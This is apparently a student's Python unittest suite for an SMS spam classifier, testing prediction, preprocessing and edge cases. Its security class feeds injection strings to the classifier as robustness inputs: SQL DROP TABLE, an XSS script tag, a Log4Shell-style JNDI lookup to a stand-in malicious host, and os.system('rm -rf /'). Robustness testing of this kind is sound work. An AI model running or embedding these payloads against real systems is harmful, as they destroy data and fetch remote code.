#!/usr/bin/env python3
# SMS Spam Detection - Test Scripts
# Cole Detrick - WGU Capstone Project

import unittest
import os
import sys
import pickle
import pandas as pd
import numpy as np
from sklearn.pipeline import Pipeline
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.naive_bayes import MultinomialNB
import logging

# Add parent directory to path to import the SMS Spam Detector class
sys.path.append('.')
from sms_spam_detector import SMSSpamDetector

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("test_scripts.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("SMS_Test_Scripts")


class TestSMSSpamDetector(unittest.TestCase):
    """Test cases for the SMS Spam Detector"""

    @classmethod
    def setUpClass(cls):
        """Set up the test environment"""
        logger.info("Setting up the test environment")

        # Create a detector instance
        cls.detector = SMSSpamDetector()

        # Check if a model file exists, otherwise create a simple one for testing
        if not os.path.exists('test_model.pkl'):
            logger.info("Creating a test model")

            # Create a simple pipeline
            model = Pipeline([
                ('tfidf', TfidfVectorizer(max_features=100)),
                ('classifier', MultinomialNB())
            ])

            # Train on a few examples
            X = [
                "Hello, how are you?",
                "Meeting at 3pm tomorrow",
                "FREE DISCOUNT! BUY NOW!",
                "URGENT: Your account has been locked",
                "Call now to claim your prize!"
            ]
            y = [0, 0, 1, 1, 1]  # 0=ham, 1=spam

            model.fit(X, y)

            # Save the model
            with open('test_model.pkl', 'wb') as f:
                pickle.dump(model, f)

        # Load the test model
        cls.detector.load_model('test_model.pkl')

        # Create some test data
        cls.ham_messages = [
            "Hi John, how are you doing?",
            "The meeting is scheduled for tomorrow at 10am",
            "Can you pick up some groceries on your way home?",
            "I'll be late for dinner tonight",
            "Don't forget to call mom on her birthday"
        ]

        cls.spam_messages = [
            "CONGRATULATIONS! You've won a free vacation!",
            "URGENT: Your account has been compromised. Click here to verify",
            "Get 90% off on all products! Limited time offer!",
            "You have won $1,000,000 in the lottery",
            "FREE GIFT! Just pay shipping and handling"
        ]

    @classmethod
    def tearDownClass(cls):
        """Clean up the test environment"""
        logger.info("Cleaning up the test environment")

        # Remove the test model if it was created for testing
        if os.path.exists('test_model.pkl'):
            os.remove('test_model.pkl')

    def test_model_loading(self):
        """Test that the model can be loaded correctly"""
        logger.info("Testing model loading")

        # Check if model is loaded
        self.assertIsNotNone(self.detector.model, "Model should be loaded")

        # Check if model has the expected components
        self.assertIn('tfidf', self.detector.model.named_steps, "Model should have a TF-IDF vectorizer")
        self.assertIn('classifier', self.detector.model.named_steps, "Model should have a classifier")

    def test_text_preprocessing(self):
        """Test text preprocessing functionality"""
        logger.info("Testing text preprocessing")

        # Test with a simple message
        message = "Hello, this is a TEST message with NUMBERS 123!"
        processed = self.detector.preprocess_text(message)

        # Check that preprocessing did what it's supposed to
        self.assertEqual(processed.lower(), processed, "Text should be lowercase")
        self.assertNotIn('123', processed, "Numbers should be removed")
        self.assertNotIn(',', processed, "Punctuation should be removed")
        self.assertNotIn('!', processed, "Punctuation should be removed")

    def test_ham_prediction(self):
        """Test prediction on ham messages"""
        logger.info("Testing ham predictions")

        for message in self.ham_messages:
            result, probability = self.detector.predict(message)
            self.assertEqual(result, "HAM", f"Message should be classified as HAM: {message}")

    def test_spam_prediction(self):
        """Test prediction on spam messages"""
        logger.info("Testing spam predictions")

        for message in self.spam_messages:
            result, probability = self.detector.predict(message)
            self.assertEqual(result, "SPAM", f"Message should be classified as SPAM: {message}")

    def test_batch_prediction(self):
        """Test batch prediction functionality"""
        logger.info("Testing batch prediction")

        # Combine ham and spam messages
        all_messages = self.ham_messages + self.spam_messages
        expected_labels = [0, 0, 0, 0, 0, 1, 1, 1, 1, 1]  # 0=ham, 1=spam

        # Perform batch prediction
        results = self.detector.batch_predict(all_messages)

        # Check results
        self.assertEqual(len(results), len(all_messages), "Should return results for all messages")
        self.assertEqual(list(results['prediction']), expected_labels, "Predictions should match expected labels")

    def test_feature_importance(self):
        """Test feature importance extraction"""
        logger.info("Testing feature importance extraction")

        # Get important features
        spam_features, ham_features = self.detector.get_important_features(n=5)

        # Check that features were extracted
        self.assertIsNotNone(spam_features, "Spam features should be extracted")
        self.assertIsNotNone(ham_features, "Ham features should be extracted")
        self.assertEqual(len(spam_features), 5, "Should return 5 spam features")
        self.assertEqual(len(ham_features), 5, "Should return 5 ham features")

        # Check feature format
        for feature, importance in spam_features:
            self.assertIsInstance(feature, str, "Feature should be a string")
            self.assertIsInstance(importance, float, "Importance should be a float")


class TestEdgeCases(unittest.TestCase):
    """Test edge cases for the SMS Spam Detector"""

    @classmethod
    def setUpClass(cls):
        """Set up the test environment"""
        logger.info("Setting up edge case tests")

        # Create a detector instance
        cls.detector = SMSSpamDetector()

        # Load the test model
        if os.path.exists('test_model.pkl'):
            cls.detector.load_model('test_model.pkl')
        else:
            logger.warning("Test model not found. Some tests may fail.")

    def test_empty_message(self):
        """Test prediction on an empty message"""
        logger.info("Testing empty message")

        if self.detector.model is None:
            self.skipTest("Model not loaded")

        # Predict an empty message
        result, probability = self.detector.predict("")

        # Empty message should be classified as ham (less risky)
        self.assertEqual(result, "HAM", "Empty message should default to HAM")

    def test_very_long_message(self):
        """Test prediction on a very long message"""
        logger.info("Testing very long message")

        if self.detector.model is None:
            self.skipTest("Model not loaded")

        # Create a very long message
        long_message = "Hello " * 1000

        # Predict the long message
        result, probability = self.detector.predict(long_message)

        # Just check that it doesn't crash
        self.assertIn(result, ["SPAM", "HAM"], "Long message should be classified")

    def test_non_english_message(self):
        """Test prediction on a non-English message"""
        logger.info("Testing non-English message")

        if self.detector.model is None:
            self.skipTest("Model not loaded")

        # Non-English messages
        messages = [
            "Hola, ¿cómo estás?",  # Spanish
            "Bonjour, comment ça va?",  # French
            "你好，你好吗？",  # Chinese
            "Здравствуйте, как дела?",  # Russian
            "مرحبا كيف حالك؟"  # Arabic
        ]

        for message in messages:
            # Just check that it doesn't crash
            result, probability = self.detector.predict(message)
            self.assertIn(result, ["SPAM", "HAM"], f"Non-English message should be classified: {message}")

    def test_special_characters(self):
        """Test prediction on messages with special characters"""
        logger.info("Testing messages with special characters")

        if self.detector.model is None:
            self.skipTest("Model not loaded")

        # Messages with special characters
        messages = [
            "Hello! @#$%^&*()_+",
            "Meeting @ 3pm tomorrow!",
            "❤️😊👍 Hello there!",
            "√∫≈≠∞ mathematical symbols",
            "§±æøå special letters"
        ]

        for message in messages:
            # Just check that it doesn't crash
            result, probability = self.detector.predict(message)
            self.assertIn(result, ["SPAM", "HAM"], f"Message with special characters should be classified: {message}")

    def test_ambiguous_messages(self):
        """Test prediction on ambiguous messages"""
        logger.info("Testing ambiguous messages")

        if self.detector.model is None:
            self.skipTest("Model not loaded")

        # Ambiguous messages that could be ham or spam
        messages = [
            "Free meeting tomorrow",
            "Urgent: please call me back",
            "Click here for the document",
            "You've been selected for promotion",
            "Important notification about your account"
        ]

        for message in messages:
            # Just check that it doesn't crash
            result, probability = self.detector.predict(message)
            self.assertIn(result, ["SPAM", "HAM"], f"Ambiguous message should be classified: {message}")
            self.assertIsInstance(probability, float, "Probability should be a float")


class TestSMSSpamDetectorSecurity(unittest.TestCase):
    """Test security features of the SMS Spam Detector"""

    @classmethod
    def setUpClass(cls):
        """Set up the test environment"""
        logger.info("Setting up security tests")

        # Create a detector instance
        cls.detector = SMSSpamDetector()

        # Load the test model
        if os.path.exists('test_model.pkl'):
            cls.detector.load_model('test_model.pkl')
        else:
            logger.warning("Test model not found. Some tests may fail.")

    def test_malformed_input(self):
        """Test handling of malformed input"""
        logger.info("Testing malformed input")

        if self.detector.model is None:
            self.skipTest("Model not loaded")

        # Test with various malformed inputs
        inputs = [
            None,
            123,
            [],
            {},
            lambda x: x
        ]

        for input_val in inputs:
            try:
                # This should not crash but might raise a TypeError
                self.detector.predict(input_val)
            except TypeError:
                # This is acceptable for non-string inputs
                pass
            except Exception as e:
                self.fail(f"Malformed input {input_val} caused unexpected exception: {str(e)}")

    def test_injection_attempt(self):
        """Test handling of potential injection attempts"""
        logger.info("Testing injection attempts")

        if self.detector.model is None:
            self.skipTest("Model not loaded")

        # Messages that might attempt various injections
        messages = [
            "'); DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "${jndi:ldap://malicious-server.com/payload}",
            "eval('console.log(\"pwned\")')",
            "os.system('rm -rf /')"
        ]

        for message in messages:
            # Just check that it doesn't crash and processes normally
            result, probability = self.detector.predict(message)
            self.assertIn(result, ["SPAM", "HAM"], f"Injection attempt should be classified normally: {message}")

    def test_unicode_handling(self):
        """Test handling of Unicode edge cases"""
        logger.info("Testing Unicode edge cases")

        if self.detector.model is None:
            self.skipTest("Model not loaded")

        # Unicode edge cases
        messages = [
            "\u0000",  # Null byte
            "\u202E" + "Hello World",  # Right-to-left override
            "\uFEFF" + "Hello World",  # Zero-width no-break space
            "Hello\u2028World",  # Line separator
            "Hello\u2029World"  # Paragraph separator
        ]

        for message in messages:
            try:
                # Just check that it doesn't crash
                result, probability = self.detector.predict(message)
                self.assertIn(result, ["SPAM", "HAM"], f"Unicode edge case should be classified")
            except Exception as e:
                self.fail(f"Unicode edge case {repr(message)} caused unexpected exception: {str(e)}")


def run_tests():
    """Run all the test cases"""
    # Create a test suite
    suite = unittest.TestSuite()

    # Add test cases
    suite.addTest(unittest.makeSuite(TestSMSSpamDetector))
    suite.addTest(unittest.makeSuite(TestEdgeCases))
    suite.addTest(unittest.makeSuite(TestSMSSpamDetectorSecurity))

    # Run the tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    return result


if __name__ == "__main__":
    print("Running SMS Spam Detector Tests...")
    result = run_tests()

    # Exit with non-zero code if tests failed
    sys.exit(not result.wasSuccessful())